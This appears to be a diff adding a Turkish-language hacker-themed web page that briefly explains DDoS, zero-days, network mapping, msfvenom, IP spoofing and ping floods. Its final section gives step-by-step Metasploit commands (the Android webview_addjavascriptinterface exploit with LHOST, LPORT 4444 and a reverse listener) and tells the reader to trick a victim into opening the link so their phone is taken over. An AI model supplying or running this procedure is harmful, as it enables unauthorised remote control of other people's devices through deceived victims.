@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet"href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"/>
+    <title>DEDSEC.EXE</title>
+  </head>
+  <body>
+    <div class="banner">
+      <nav class="navbar">
+        <img src="image (1).png" alt="" class="logo" width="250" height="150--" />
+        <h1>NO SYSTEM İS SAFE  -MRX</h1>
+        <img src="image (2).png" alt="" class="logoo" width="250" height="150--" />
+      </nav> 
+      
+    <div id="hero">
+      <video autoplay loop muted>
+        <source src="dedsec.mp4" type="video/mp4">
+      </source></video>
+
+      <div class="conte">
+        <div class="contai">
+          <h1><span id="içer">DDoS (Distributed Denial of Service)</span></h1>
+          <p>DDos saldırısı mantık olarak DoS saldırısı ile çok yakın olsa da DoS saldırısından bir farkı vardır. Bu saldırıda saldırganlar birden fazla fazla bilgisayar veya internet bağlantısı kullanır. Hedef sistem işlemez hale getirir.</p>
+          <h1><span id="içer">ZERO-DAY</span></h1>
+          <p>Zero-Day zafiyeti üreticinin açığı fark etmeden önce kötü amaçlı kişiler tarafında fark edilip kullanılan bir zafiyet türüdür. Üretici sorunu çok kısa süre önce öğrendiği ve yama yayınlamak için "Sıfrı Güne" sahip olduğu için Zero-Day olarak adlandırılmaktadır.</p>
+          <h1><span id="içer">Network Mapping (Ağ Haritalama)</span></h1>
+          <p>Network Mapping ağa bağlı cihazların Tarama , Port Tarama , SNMP Tarama ve diğer teknikler kullanılarak yapılan keşif işlemlerii içerir. Bu işlem sonucunda ağda bulunan her cihazın İP adresi MAC adresi işletim sistemi açık portlar servisler ve diğer bilgiler gibi öenmli ayrıntılar belirlenebilir.</p>
+        </div>
+      </div>
+      <div class="cont">
+        <div class="conta">
+          <h1><span id="içe">MSFVENOM </span></h1>
+          <p>Kendi zararlı yazılımlarımızı oluşturmakta kullanılabilecek bir yazılım olan MSFVENOM ile <br>-PAYLOAD <br>
+          -BACKDOOR <br>
+        -TROJAN <BR>
+        gibi işlemler yazılımlar yapılabilir .</BR></p>
+         <h1><span id="içe">IP SPOOFING </span></h1>
+          <P>Saldırıda adresi değiştirilen IP paketi,meşru ve güvenilir başka bir kaynaktan geliyormuş gibi gösterilir. Kaynakça gerçekmiş gibi göründüğü için veriler alıcı tarafından kabul edilir.Siber saldıgan IP adresi başlığını değiştirmek için çeşitli IP sızdırma araçlarını kullanır. Adres bir kez harici olarak değiştirildiğinde alıcının bunu tanımlaması,ölçmesi,filtrelemesi imkansızdır.Kaynağın IP adresi başka bri IP adresini taklit edecek şekilde değiştirildğinde saldırı başlatımış olur.</P>
+          <h1><span id="içe">PING FLOOD </span></h1>
+          <P>Pıng Flood saldırısında hedef cihazın kapasitesini aşacak kadar fazla ping isteği gönderilir. Kapasite aşıldığında ağ hizmetlerinde kesinti olur.</P>
+        </div>
+      </div>
+
+      <div class="content">
+        <div class="container">
+          <h1><span id="içerik"> (Sızma Testi) Termux İle Trojan Yapımı</span></h1>
+          <p>Adım 1 : İlk öncelikle dış ipinizi öğrenmeniz gerekiyor herhangi bir siteden kolayca öğrenebilirsiniz. <br>
+
+        <br> Adım 2 : metasploiti çalıştıralım <br>
+            
+          <br>  Adım 3 : metasploite girdikden sonra en aşağıdaki verdiğim komutları sırasyıla uygulayınız <br>
+            
+         <br>   Adım 4 : Size Verilen linki (http://dışip:8080/) kurbana bir şekilde yedirin ve tıklaması halinde telefonu artık sizin olmuş olur :) <br>
+            
+           <br> Bilgi : Bu işlemleri yaparken açtığınız terminali kapatmayınız. <br>
+           <br> Kodlar : <br>
+            
+           <br> use exploit/android/browser/webview_addjavascriptinterface<br>
+            
+           <br> set SRVHOST dışip<br>
+            
+           <br> set URIPATH /<br>
+            
+           <br> set LHOST dışip<br>
+            
+           <br> set LPORT 4444<br>
+            
+           <br> show advanced<br>
+            
+           <br> set VERBOSE true<br>
+            
+           <br> set ReverseListenerBindAddress dışip<br>
+            
+           <br> set ReverseListenerBindPort 4444<br>
+            
+           <br> run <br> </p>
+        </div>
+        
+    </div>
+  </body>
+</html>
